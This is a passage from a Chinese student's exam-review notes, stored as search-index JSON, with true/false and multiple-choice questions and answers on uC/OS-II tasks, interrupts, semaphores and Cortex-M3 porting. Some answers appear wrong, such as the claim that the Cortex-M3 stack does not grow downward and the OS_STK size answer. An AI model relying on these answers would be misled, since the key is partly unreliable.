ucos\u7684\u4efb\u52a1\u53ef\u4ee5\u6709\u8fd4\u56de\u503c\u3002\u5982\u53ef\u4ee5\u5b9a\u4e49\u4e3a int task_A\uff5b\uff5d\u3002 False ucos\u7684\u4efb\u52a1\u662f\u53ef\u4ee5\u5220\u9664\u81ea\u5df1\u7684\u3002\u5373\u628a\u4efb\u52a1\u4ee3\u7801\u4ece\u5185\u5b58\u4e2d\u5220\u9664\u6389\u3002 False ucos\u4e2d\u4efb\u52a1\u4f18\u5148\u7ea7\u4e3a0\u7684\u4efb\u52a1\uff0c\u4f18\u5148\u7ea7\u662f\u6700\u9ad8\u7684\u3002 True ucos\u5c31\u7eea\u8868\u4e2d\u5c31\u7eea\u7684\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u4e3a20\u300130\u300140\uff0c\u5199\u51faOSRdyGrp\u548c\u5bf9\u5e94\u7684OSRdyTbl\u7684\u4e8c\u8fdb\u5236\u503c\u3002 \u7b54\u6848\uff1a OSRdyGrp=00101100B; OSRdyTbl[2]=00010000B; OSRdyTbl[3]=01000000B; OSRdyTbl[5]=00000001B; \u6839\u636e\u5c31\u7eea\u8868\u786e\u5b9a\u6700\u9ad8\u4f18\u5148\u7ea7 OSRdyGrp=0x24=00100 100B OSRdyTbl[2]=00100 100B OSRdyTbl[5]=00101 110B \u5199\u51fa\u5f53\u524d\u4f18\u5148\u7ea7\u6700\u9ad8\u7684\u4efb\u52a1\u7684\u4f18\u5148\u7ea7\u3002 \u7b54\u6848\uff1a prio=2*8+2=18 \u6709\u5173\u4efb\u52a1\u7ba1\u7406\uff0c\u6b63\u786e\u7684\u662f\uff1a A. \u4efb\u52a1\u53ef\u4ee5\u5728main\u51fd\u6570\u4e2d\u521b\u5efa\u3002 B. \u4efb\u52a1\u53ef\u4ee5\u5728\u5176\u4ed6\u4efb\u52a1\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u7531\u4efb\u52a1\u521b\u5efa\u3002 C. \u4efb\u52a1\u53ef\u4ee5\u5728\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u521b\u5efa\u3002 D. main\u51fd\u6570\u4e2d\u81f3\u5c11\u8981\u521b\u5efa\u4e00\u4e2a\u4efb\u52a1\u3002 \u7b54\u6848\uff1a ABD \u6709\u5173\u4efb\u52a1\u7684\u5806\u6808\uff0c\u6b63\u786e\u7684\u662f\uff1a A. ucos\u4e2d\u7684\u4efb\u52a1\u90fd\u5fc5\u987b\u5206\u914d\u5806\u6808\u3002 B. ucos\u4e2d\u4efb\u52a1\u7684\u5806\u6808\u5927\u5c0f\u90fd\u662f\u76f8\u540c\u7684\u3002 C. \u53ef\u4ee5\u901a\u8fc7malloc\u51fd\u6570\u52a8\u6001\u4e3a\u4efb\u52a1\u5206\u914d\u5806\u6808\u3002 D. ucos\u5728\u4efb\u52a1\u5207\u6362\u8fc7\u7a0b\u4e2d\uff0c\u88ab\u6302\u8d77\u7684\u4efb\u52a1\u4f7f\u7528\u7684CPU\u5bc4\u5b58\u5668\u662f\u4fdd\u5b58\u5728\u8be5\u4efb\u52a1\u7684\u5806\u6808\u4e2d\u7684\u3002 \u7b54\u6848\uff1a ACD \u6709\u5173\u7a7a\u95f2\u4efb\u52a1\uff0c\u6b63\u786e\u7684\u662f\uff1a A. \u7cfb\u7edf\u4efb\u52a1\u3002 B. \u4f18\u5148\u7ea7\u6700\u4f4e\u3002 C. \u6c38\u8fdc\u4e0d\u4f1a\u88ab\u653e\u5165\u5230\u7b49\u5f85\u5217\u8868\uff0c\u800c\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\u3002 D. \u7a7a\u95f2\u4efb\u52a1\u4e5f\u53ef\u4ee5\u88ab\u5220\u9664\u3002 \u7b54\u6848\uff1a ABC ucos\u662f\u57fa\u4e8e\u65f6\u95f4\u7247\u7684\u5185\u6838\u3002 False ucos\u4efb\u52a1\u88ab\u5220\u9664\u540e\uff0c\u5b83\u6240\u5360\u7528\u7684\u8d44\u6e90\u4f1a\u81ea\u52a8\u91ca\u653e\u3002 False ucos\u53ef\u4ee5\u5728\u4e2d\u65ad\u5904\u7406\u4e2d\u5220\u9664\u4efb\u52a1\u3002 False ucos\u4e2d\u4efb\u52a1\u53ef\u4ee5\u81ea\u5df1\u6302\u8d77\u4e5f\u53ef\u4ee5\u7531\u5176\u4ed6\u4efb\u52a1\u4f7f\u5b83\u6302\u8d77\u3002 True \u5982\u679c\u4efb\u52a1\u6b63\u5728\u7b49\u5f85\u4fe1\u53f7\u91cf\uff0c\u6b64\u65f6\u89e3\u6302\uff0c\u4efb\u52a1\u4e5f\u4e0d\u4f1a\u9a6c\u4e0a\u6267\u884c\u6216\u8005\u8fdb\u5165\u5c31\u7eea\u6001\uff0c\u76f4\u5230\u83b7\u5f97\u4fe1\u53f7\u91cf\u6216\u8005\u7b49\u5f85\u8d85\u65f6\u624d\u80fd\u8fdb\u5165\u5c31\u7eea\u6001\uff0c\u5982\u679c\u5904\u4e8e\u5c31\u7eea\u8868\u4e2d\u4f18\u5148\u7ea7\u6700\u9ad8\uff0c\u5219\u8fdb\u5165\u8fd0\u884c\u6001\u3002 True 2.3. \u4e2d\u65ad # \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u9700\u8981\u505a\u7684\u4e8b\u60c5\u5305\u62ec\uff1a A. \u4fdd\u62a4\u4e0a\u4e0b\u6587\uff0c\u5373\u4fdd\u62a4\u73b0\u573a B. \u67e5\u627e\u4e2d\u65ad\u5411\u91cf\u8868\uff0c\u628a\u4e2d\u65ad\u670d\u52a1\u7684\u5165\u53e3\u5730\u5740\u53d6\u51fa\u9001\u7ed9\u6307\u4ee4\u6307\u9488 C. \u6062\u590d\u4e0a\u4e0b\u6587\uff0c\u5373\u6062\u590d\u73b0\u573a D. \u7f16\u5199\u5177\u4f53\u64cd\u4f5c\u7a0b\u5e8f \u7b54\u6848\uff1a ACD \u6709\u5173\u4e2d\u65ad\u7684\u5806\u6808\uff0c\u6b63\u786e\u7684\u63cf\u8ff0\u662f\uff1a A. \u4e2d\u65ad\u4e0d\u9700\u8981\u5806\u6808 B. \u4e2d\u65ad\u53ef\u4ee5\u4f7f\u7528\u88ab\u4e2d\u7684\u90a3\u4e2a\u4efb\u52a1\u7684\u5806\u6808 C. \u4e2d\u65ad\u53ef\u4ee5\u4f7f\u7528\u5355\u72ec\u7684\u4e2d\u65ad\u6808\uff0c\u800c\u4e0d\u4f7f\u7528\u4efb\u52a1\u7684\u5806\u6808 D. \u4e2d\u65ad\u4f7f\u7528\u7684\u5806\u6808\u53ef\u4ee5\u968f\u65f6\u52a8\u6001\u5206\u914d \u7b54\u6848\uff1a BC \u5f71\u54cd\u5b9e\u65f6\u5d4c\u5165\u5f0f\u7cfb\u7edf\u7684\u5b9e\u65f6\u6027\u80fd\u7684\u662f\uff1a A. \u4e2d\u65ad\u7684\u54cd\u5e94\u65f6\u95f4 B. \u4efb\u52a1\u7684\u5207\u6362\u65f6\u95f4 C. \u5d4c\u5165\u5f0f\u64cd\u4f5c\u7cfb\u7edf\u7684\u65f6\u949f\u8282\u62cd D. \u5f00\u3001\u5173\u4e2d\u65ad\u7684\u65f6\u95f4 \u7b54\u6848\uff1a ABCD \u975e\u5c4f\u853d\u4e2d\u65ad\u6e90\u4e00\u65e6\u4ea7\u751f\u4e2d\u65ad\u7533\u8bf7\uff0cCPU\u5728\u6267\u884c\u5b8c\u5f53\u524d\u6307\u4ee4\u540e\u5fc5\u987b\u54cd\u5e94\u3002 True \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u662f\u53ef\u4ee5\u53d1\u9001\u4fe1\u53f7\u91cf\u7ed9\u67d0\u4e00\u4e2a\u4efb\u52a1\u7684 True \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u53ef\u4ee5\u7b49\u5f85\u4e00\u4e2a\u4fe1\u53f7\u91cf False \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u53ef\u4ee5\u521b\u5efa\u4efb\u52a1 False \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u53ef\u4ee5\u52a8\u6001\u7684\u5206\u914d\u5185\u5b58\u6216\u8005\u91ca\u653e\u5185\u5b58 False \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u5c3d\u91cf\u505a\u6700\u5c11\u7684\u4e8b\u60c5\uff0c\u5c3d\u5feb\u5b8c\u6210 True \u6709\u4e2d\u65ad\u5d4c\u5957\u7684\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u7f16\u5199\u53ef\u91cd\u5165\u578b\u51fd\u6570 True 2.4. \u540c\u6b65\u4e92\u65a5\u548c\u901a\u4fe1 # ucos\u4e2d\u4fe1\u53f7\u91cf\u7684\u521d\u503c\u53ef\u4ee5\u662f\uff1a A. 0 B. 1 C. 0\uff5e65535\u4e4b\u95f4\u7684\u4efb\u610f\u6570 D. \u4efb\u610f\u503c \u7b54\u6848\uff1a ABC \u7528\u4fe1\u53f7\u91cf\u6807\u8bc6\u4e8b\u4ef6\u7684\u53d1\u751f\u65f6\uff0c\u521d\u503c\u4e00\u822c\u8bbe\u7f6e\u4e3a A. 1 B. 0 C. 0\uff5e65535\u4e4b\u95f4 D. \u4efb\u610f\u503c \u7b54\u6848\uff1a B \u4e0b\u5217\u54ea\u4e9b\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u5171\u4eab\u8d44\u6e90\u7684\u540c\u6b65\u8bbf\u95ee A. \u4e8c\u503c\u4fe1\u53f7\u91cf B. \u4e92\u65a5\u4fe1\u53f7\u91cfMUTEX C. \u521d\u503c\u4e3an\u7684\u4fe1\u53f7\u91cf\uff08n\u4e3a0\uff5e65535\u4e4b\u95f4\u7684\u503c\uff09 D. \u90fd\u4e0d\u80fd \u7b54\u6848\uff1a AB \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d\u53ef\u4ee5\u8c03\u7528\u7684\u51fd\u6570\u4e3a A. OSSemCreate\uff08\uff09 B. OSSemPend\uff08\uff09 C. OSSemAccept\uff08\uff09 D. OSSemPost\uff08\uff09 \u7b54\u6848\uff1a CD \u5047\u5982\u4e00\u4e2aAD\u4efb\u52a1\u9700\u8981\u5c06\u91c7\u96c6\u7684\u6570\u636e\u53d1\u9001\u7ed9\u663e\u793a\u4efb\u52a1\uff0c\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\u7684\u673a\u5236\u6709 A. \u4fe1\u53f7\u91cf B. \u90ae\u7bb1 C. \u6d88\u606f\u961f\u5217 D. MUTEX\u548c\u5168\u5c40\u53d8\u91cf\u7ec4\u5408\u4f7f\u7528 \u7b54\u6848\uff1a BD \u53ef\u4ee5\u5728\u4e0b\u5217\u54ea\u79cd\u60c5\u51b5\u4e0b\u521b\u5efa\u6d88\u606f\u961f\u5217\uff1f A. main\uff08\uff09\u51fd\u6570\u4e2d B.for\u5faa\u73af\u4e4b\u524d taskA(){ for(,,){} } C. \u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u4e2d D.for\u5faa\u73af\u4e2d taskA(){ for(,,){} } \u7b54\u6848\uff1a AB 2.5. \u5185\u6838\u79fb\u690d # ARM Cortex M3\u7684\u5806\u6808\u662f\u5411\u4e0b\u589e\u957f\u7684 False \u53ef\u4ee5\u81ea\u4e3b\u5b9a\u4e49 Cortex M3\u79fb\u690ducos-II\uff0c\u4e0a\u4e0b\u6587\u5207\u6362\u5b9e\u9645\u4e0a\u662f\u6a21\u62df\u4e86\u4e00\u6b21PendSV\u4e2d\u65ad\u3002 True BSP\uff08Board Support Package\uff09\u7684\u529f\u80fd\u53ef\u4ee5\u5305\u62ec\uff1a A. \u5916\u90e8\u8bbe\u5907\u521d\u59cb\u5316 B. \u677f\u7ea7\u521d\u59cb\u5316 C. \u7cfb\u7edf\u7ea7\u521d\u59cb\u5316 D. \u82af\u7247\u7ea7\u521d\u59cb\u5316 \u7b54\u6848\uff1aBCD BSP\u4e3b\u8981\u529f\u80fd\u4e3a\u5c4f\u853d\u786c\u4ef6\uff0c\u63d0\u4f9b\u64cd\u4f5c\u7cfb\u7edf\u53ca\u786c\u4ef6\u9a71\u52a8\uff0c\u5177\u4f53\u529f\u80fd\u5305\u62ec\uff1a \u5355\u677f\u786c\u4ef6\u521d\u59cb\u5316\uff0c\u4e3b\u8981\u662fCPU\u7684\u521d\u59cb\u5316\uff0c\u4e3a\u6574\u4e2a\u8f6f\u4ef6\u7cfb\u7edf\u63d0\u4f9b\u5e95\u5c42\u786c\u4ef6\u652f\u6301 \u4e3a\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u548c\u7cfb\u7edf\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f \u5b9a\u5236\u64cd\u4f5c\u7cfb\u7edf\u7684\u529f\u80fd\uff0c\u4e3a\u8f6f\u4ef6\u7cfb\u7edf\u63d0\u4f9b\u4e00\u4e2a\u5b9e\u65f6\u591a\u4efb\u52a1\u7684\u8fd0\u884c\u73af\u5883 \u521d\u59cb\u5316\u64cd\u4f5c\u7cfb\u7edf\uff0c\u4e3a\u64cd\u4f5c\u7cfb\u7edf\u7684\u6b63\u5e38\u8fd0\u884c\u505a\u597d\u51c6\u5907\u3002 \u5bf9\u4e8eARM Cortex M3\u5fae\u5904\u7406\u5668\uff0c\u7528OS_STK\u4e3a\u4efb\u52a1\u5206\u914d\u5806\u6808\u65f6\uff0c\u5373 OS _STK Task_STK[256]; A. \u5206\u914d\u4e86256\u4e2aBYTE B. \u5806\u6808\u7684\u6808\u9876\u6307\u9488\u4e3aTask_STK C. \u5206\u914d\u4e86256*4\u4e2aBYTE D. \u5206\u914d\u4e86256*2\u4e2aBYTE \u7b54\u6848\uff1aBD typedef unsigned int OS_STK; / Each stack entry is 16-bit wide / \u6ee1\u8db3ucos-ii\u79fb\u690d\u7684\u6761\u4ef6\u6709\uff1a A. \u5904\u7406\u5668\u652f\u6301\u786c\u4ef6\u4e2d\u65ad B. \u5904\u7406\u5668\u6709\u8db3\u591f\u7684\u786c\u4ef6\u5806\u6808 C. \u7f16\u8bd1\u5668\u652f\u6301\u53ef\u91cd\u5165\u578b\u51fd\u6570 D. \u5fae\u5904\u7406\u5668\u5177\u6709PUSH\u548cPOP\u6307\u4ee4\uff0c\u64cd\u4f5c\u5806\u6808 \u7b54\u6848\uff1aBCD \u79fb\u690duC/OS-II\u5230\u5904\u7406\u5668\u4e0a\u5fc5\u987b\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\u3002 \u5904\u7406\u5668\u7684 C \u7f16\u8bd1\u5668\u80fd\u4ea7\u751f\u53ef\u91cd\u5165\u4ee3\u7801\u3002 \u7528 C \u8bed\u8a00\u53ef\u6253\u5f00\u548c\u5173\u95ed\u4e2d\u65ad\u3002 \u5904\u7406\u5668\u652f\u6301\u4e2d\u65ad\u5e76\u4e14\u80fd\u4ea7\u751f\u5b9a\u65f6\u4e2d\u65ad\u3002 \u5904\u7406\u5668\u652f\u6301\u80fd\u591f\u5bb9\u7eb3\u4e00\u5b9a\u91cf\u6570\u636e\u7684\u786c\u4ef6\u5806\u6808\u3002 \u5904\u7406\u5668\u6709\u5c06\u5806\u6808\u6307\u9488\u548c\u5176\u4ed6 CPU \u5bc4\u5b58\u5668\u8bfb\u51fa\u548c\u5b58\u50a8\u5230\u5806\u6808(\u6216\u5185\u5b58)\u7684\u6307\u4ee4\u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"8.\u590d\u4e60\u9898"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.%E5%A4%8D%E4%B9%A0%E9%A2%98/#_1","text":"","title":"\u5d4c\u5165\u5f0f\u7cfb\u7edf\u590d\u4e60\u9898"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.%E5%A4%8D%E4%B9%A0%E9%A2%98/#_2","text":"\u5d4c\u5165\u5f0f\u7cfb\u7edf\u590d\u4e60\u9898 \u76ee\u5f55 1. \u80cc\u666f 2. \u9898\u76ee 2.1. \u5d4c\u5165\u5f0f\u7cfb\u7edf\u57fa\u7840 2.2. \u4efb\u52a1\u7ba1\u7406\u4e0e\u8c03\u5ea6 2.3. \u4e2d\u65ad 2.4. \u540c\u6b65\u4e92\u65a5\u548c\u901a\u4fe1 2.5. \u5185\u6838\u79fb\u690d","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.%E5%A4%8D%E4%B9%A0%E9%A2%98/#1","text":"\u6700\u8fd1\u5feb\u8981\u671f\u672b\u8003\u8bd5\u4e86\uff0c\u6211\u628a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u7684\u4e60\u9898\u6574\u7406\u4e86\u4e00\u4e0b\uff0c\u6574\u7406\u6210\u4e86\u8fd9\u7bc7\u7b14\u8bb0\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.%E5%A4%8D%E4%B9%A0%E9%A2%98/#2","text":"","title":"2. \u9898\u76ee"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/8.%E5%A4%8D%E4%B9%A0%E9%A2%98/#21","text":"\u4ec0\u4e48\u662f\u5d4c\u5165\u5f0f\u7cfb\u7edf\uff1f\u4e3e\u4f8b\u8bf4\u660e\u5d4c\u5165\u5f0f\u7cfb\u7edf\u7684\u5178\u578b\u5e94\u7528\u3002 \u5d4c\u5165\u5f0f\u7cfb\u7edf\u662f\u201c\u7528\u4e8e\u63a7\u5236\u3001\u76d1\u89c6\u6216\u8005\u8f85\u52a9\u64cd\u4f5c\u673a\u5668\u548c\u8bbe\u5907\u7684\u88c5\u7f6e\u201d\uff08\u539f\u6587\u4e3adevices used to control, monitor, or assist the operation of equipment, machinery or plants\uff09\u3002 \u5178\u578b\u7684\u5e94\u7528\u5982\uff1a\u51b0\u7bb1\u3001\u6d17\u8863\u673a\u3001\u7a7a\u8c03\u3001\u5de5\u4e1a\u673a\u5668\u4eba\u3001\u667a\u80fd\u95e8\u7981\u3001\u6c7d\u8f66\u7535\u5b50\u3001\u5171\u4eab\u5355\u8f66\u7b49\u7b49\u3002 \u5d4c\u5165\u5f0f\u5fae\u5904\u7406\u5668\u6709\u54ea\u4e24\u79cd\u67b6\u6784\uff1f\u533a\u522b\u662f\u4ec0\u4e48\u3002 \u51af\u00b7\u8bfa\u4f0a\u66fc\u7ed3\u6784\u548c\u54c8\u4f5b\u7ed3\u6784\u3002 \u51af\u00b7\u8bfa\u4f0a\u66fc\u7ed3\u6784\u8f83\u4e3a\u7b80\u5355\uff0c\u6210\u672c\u4f4e\uff0c\u8fd0\u7b97\u901f\u5ea6\u6bd4\u54c8\u4f5b\u7ed3\u6784\u6162\u3002 \u54c8\u4f5b\u7ed3\u6784\u80fd\u591f\u9ad8\u901f\u5904\u7406\u6570\u636e\uff0c\u53ef\u4ee5\u540c\u65f6\u8bfb\u53d6\u5206\u5f00\u5b58\u50a8\u7684\u6307\u4ee4\u548c\u6570\u636e\uff0c\u4f46\u7ed3\u6784\u6bd4\u8f83\u590d\u6742\uff0c\u6210\u672c\u9ad8\u3002 \u51af\u00b7\u8bfa\u4f9d\u66fc\u7406\u8bba\u7684\u8981\u70b9\u662f\uff1a\u6570\u5b57\u8ba1\u7b97\u673a\u7684\u6570\u5236\u91c7\u7528\u4e8c\u8fdb\u5236\uff1b\u8ba1\u7b97\u673a\u5e94\u8be5\u6309\u7167\u7a0b\u5e8f\u987a\u5e8f\u6267\u884c\u3002\u4eba\u4eec\u628a\u51af\u8bfa\u4f9d\u66fc\u7684\u8fd9\u4e2a\u7406\u8bba\u79f0\u4e3a\u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u3002\u4eceENIAC\u5230\u5f53\u524d\u6700\u5148\u8fdb\u7684\u8ba1\u7b97\u673a\u90fd\u91c7\u7528\u7684\u662f\u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u3002\u6240\u4ee5\u51af\u8bfa\u4f9d\u66fc\u662f\u5f53\u4e4b\u65e0\u6127\u7684\u6570\u5b57\u8ba1\u7b97\u673a\u4e4b\u7236\u3002 \u6570\u5b66\u5bb6\u51af\u00b7\u8bfa\u4f9d\u66fc\u63d0\u51fa\u4e86\u8ba1\u7b97\u673a\u5236\u9020\u7684\u4e09\u4e2a\u57fa\u672c\u539f\u5219\uff0c\u5373\u91c7\u7528\u4e8c\u8fdb\u5236\u903b\u8f91\u3001\u7a0b\u5e8f\u5b58\u50a8\u6267\u884c\u4ee5\u53ca\u8ba1\u7b97\u673a\u7531\u4e94\u4e2a\u90e8\u5206\u7ec4\u6210\uff08\u8fd0\u7b97\u5668\u3001\u63a7\u5236\u5668\u3001\u5b58\u50a8\u5668\u3001\u8f93\u5165\u8bbe\u5907\u3001\u8f93\u51fa\u8bbe\u5907\uff09\uff0c\u8fd9\u5957\u7406\u8bba\u88ab\u79f0\u4e3a\u51af\u00b7\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u3002 \u6839\u636e\u51af\u8bfa\u4f9d\u66fc\u4f53\u7cfb\u7ed3\u6784\u6784\u6210\u7684\u8ba1\u7b97\u673a\uff0c\u5fc5\u987b\u5177\u6709\u5982\u4e0b\u529f\u80fd\uff1a \u628a\u9700\u8981\u7684\u7a0b\u5e8f\u548c\u6570\u636e\u9001\u81f3\u8ba1\u7b97\u673a\u4e2d\uff1b \u5fc5\u987b\u5177\u6709\u957f\u671f\u8bb0\u5fc6\u7a0b\u5e8f\u3001\u6570\u636e\u3001\u4e2d\u95f4\u7ed3\u679c\u53ca\u6700\u7ec8\u8fd0\u7b97\u7ed3\u679c\u7684\u80fd\u529b\uff1b \u80fd\u591f\u5b8c\u6210\u5404\u79cd\u7b97\u672f\u3001\u903b\u8f91\u8fd0\u7b97\u548c\u6570\u636e\u4f20\u9001\u7b49\u6570\u636e\u52a0\u5de5\u5904\u7406\u7684\u80fd\u529b\uff1b \u80fd\u591f\u6839\u636e\u9700\u8981\u63a7\u5236\u7a0b\u5e8f\u8d70\u5411\uff0c\u5e76\u80fd\u6839\u636e\u6307\u4ee4\u63a7\u5236\u673a\u5668\u7684\u5404\u90e8\u4ef6\u534f\u8c03\u64cd\u4f5c\uff1b \u80fd\u591f\u6309\u7167\u8981\u6c42\u5c06\u5904\u7406\u7ed3\u679c\u8f93\u51fa\u7ed9\u7528\u6237\u3002 \u54c8\u4f5b\u7ed3\u6784\u662f\u4e3a\u4e86\u9ad8\u901f\u6570\u636e\u5904\u7406\u800c\u91c7\u7528\u7684\uff0c\u56e0\u4e3a\u53ef\u4ee5\u540c\u65f6\u8bfb\u53d6\u6307\u4ee4\u548c\u6570\u636e\uff08\u5206\u5f00\u5b58\u50a8\u7684\uff09\u3002\u5927\u5927\u63d0\u9ad8\u4e86\u6570\u636e\u541e\u5410\u7387\uff0c\u7f3a\u70b9\u662f\u7ed3\u6784\u590d\u6742 \u3002\u901a\u7528\u5fae\u673a\u6307\u4ee4\u548c\u6570\u636e\u662f\u6df7\u5408\u5b58\u50a8\u7684\uff0c\u7ed3\u6784\u4e0a\u7b80\u5355\uff0c\u6210\u672c\u4f4e\u3002\u5047\u8bbe\u662f\u54c8\u4f5b\u7ed3\u6784\uff1a\u4f60\u5c31\u5f97\u5728\u7535\u8111\u5b89\u88c5\u4e24\u5757\u786c\u76d8\uff0c\u4e00\u5757\u88c5\u7a0b\u5e8f\uff0c\u4e00\u5757\u88c5\u6570\u636e\uff0c\u5185\u5b58\u88c5\u4e24\u6839\uff0c\u4e00\u6839\u50a8\u5b58\u6307\u4ee4\uff0c\u4e00\u6839\u5b58\u50a8\u6570\u636e\u2026\u2026 \u54c8\u4f5b\u7ed3\u6784\u5904\u7406\u5668\u6709\u4e24\u4e2a\u660e\u663e\u7684\u7279\u70b9\uff1a\u4f7f\u7528\u4e24\u4e2a\u72ec\u7acb\u7684\u5b58\u50a8\u5668\u6a21\u5757\uff0c\u5206\u522b\u5b58\u50a8\u6307\u4ee4\u548c\u6570\u636e\uff0c\u6bcf\u4e2a\u5b58\u50a8\u6a21\u5757\u90fd\u4e0d\u5141\u8bb8\u6307\u4ee4\u548c\u6570\u636e\u5e76\u5b58\uff1b\u4f7f\u7528\u72ec\u7acb\u7684\u4e24\u6761\u603b\u7ebf\uff0c\u5206\u522b\u4f5c\u4e3aCPU\u4e0e\u6bcf\u4e2a\u5b58\u50a8\u5668\u4e4b\u95f4\u7684\u4e13\u7528\u901a\u4fe1\u8def\u5f84\uff0c\u800c\u8fd9\u4e24\u6761\u603b\u7ebf\u4e4b\u95f4\u6beb\u65e0\u5173\u8054\u3002 \u6539\u8fdb\u7684\u54c8\u4f5b\u7ed3\u6784\uff0c\u5176\u7ed3\u6784\u7279\u70b9\u4e3a\uff1a\u4ee5\u4fbf\u5b9e\u73b0\u5e76\u884c\u5904\u7406\uff1b\u5177\u6709\u4e00\u6761\u72ec\u7acb\u7684\u5730\u5740\u603b\u7ebf\u548c\u4e00\u6761\u72ec\u7acb\u7684\u6570\u636e\u603b\u7ebf\uff0c\u5229\u7528\u516c\u7528\u5730\u5740\u603b\u7ebf\u8bbf\u95ee\u4e24\u4e2a\u5b58\u50a8\u6a21\u5757\uff08\u7a0b\u5e8f\u5b58\u50a8\u6a21\u5757\u548c\u6570\u636e\u5b58\u50a8\u6a21\u5757\uff09\uff0c\u516c\u7528\u6570\u636e\u603b\u7ebf\u5219\u88ab\u7528\u6765\u5b8c\u6210\u7a0b\u5e8f\u5b58\u50a8\u6a21\u5757\u6216\u6570\u636e\u5b58\u50a8\u6a21\u5757\u4e0eCPU\u4e4b\u95f4\u7684\u6570\u636e\u4f20\u8f93\u3002 \u662f\u4ec0\u4e48\u7ed3\u6784\u8981\u770b\u603b\u7ebf\u7ed3\u6784\u7684\u300251\u5355\u7247\u673a\u867d\u7136\u6570\u636e\u6307\u4ee4\u5b58\u50a8\u533a\u662f\u5206\u5f00\u7684\uff0c\u4f46\u603b\u7ebf\u662f\u5206\u65f6\u590d\u7528\u7684\uff0c\u6240\u4ee5\u9876\u591a\u7b97\u6539\u8fdb\u578b\u7684\u54c8\u4f5b\u7ed3\u6784\u3002ARM9\u867d\u7136\u662f\u54c8\u4f5b\u7ed3\u6784\uff0c\u4f46\u662f\u4e4b\u524d\u7684\u7248\u672c\u4e5f\u8fd8\u662f\u51af\u00b7\u8bfa\u4f9d\u66fc\u7ed3\u6784\u3002\u65e9\u671f\u7684X86\u80fd\u8fc5\u901f\u5360\u6709\u5e02\u573a\uff0c\u4e00\u6761\u5f88\u91cd\u8981\u7684\u539f\u56e0\uff0c\u6b63\u662f\u9760\u4e86\u51af\u00b7\u8bfa\u4f9d\u66fc\u8fd9\u79cd\u5b9e\u73b0\u7b80\u5355\uff0c\u6210\u672c\u4f4e\u7684\u603b\u7ebf\u7ed3\u6784\u3002\u5904\u7406\u5668\u867d\u7136\u5916\u90e8\u603b\u7ebf\u4e0a\u770b\u662f\u8bfa\u4f9d\u66fc\u7ed3\u6784\u7684\uff0c\u4f46\u662f\u7531\u4e8e\u5185\u90e8CACHE\u7684\u5b58\u5728\uff0c\u56e0\u6b64\u5b9e\u9645\u4e0a\u5185\u90e8\u6765\u770b\u5df2\u7ecf\u7b97\u662f\u6539\u8fdb\u578b\u54c8\u4f5b\u7ed3\u6784\u7684\u4e86\u3002 \u6bd4\u8f83ucos\u548cuClinux\u7684\u5185\u6838\u7279\u70b9\uff0c\u4e3e\u4f8b\u8bf4\u660e\u5176\u5404\u81ea\u9002\u7528\u7684\u573a\u5408\u3002 uc/os\u9002\u5408\u5c0f\u578b\u63a7\u5236\u7cfb\u7edf\uff0c\u5177\u6709\u6267\u884c\u6548\u7387\u9ad8\u3001\u5360\u7528\u7a7a\u95f4\u5c0f\u3001\u5b9e\u65f6\u6027\u80fd\u4f18\u826f\u548c\u53ef\u6269\u5c55\u6027\u5f3a\u7b49\u7279\u70b9\uff0c\u6700\u5c0f\u5185\u6838\u53ef\u7f16\u8bd1\u81f32k\u3002 